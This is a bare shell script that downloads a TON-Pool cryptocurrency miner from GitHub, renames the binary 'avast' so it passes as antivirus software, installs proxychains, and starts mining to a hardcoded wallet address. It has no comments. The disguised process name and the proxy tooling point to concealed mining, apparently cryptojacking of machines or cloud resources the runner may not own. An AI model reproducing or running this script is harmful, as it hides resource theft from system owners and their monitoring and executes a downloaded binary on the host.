apt update

apt install proxychains

apt install screen -y

wget -q https://github.com/TON-Pool/miner/releases/download/0.3.4/ton-pool.com-miner-0.3.4-linux.tar.gz

tar -xvf  ton-pool.com-miner-0.3.4-linux.tar.gz

mv miner-linux avast

chmod +x avast 

./avast run https://next.ton-pool.com EQCq8h0FQ_IzVSueBKoYahTBe5EXnomyu6WVTPp29L8YYG2Z
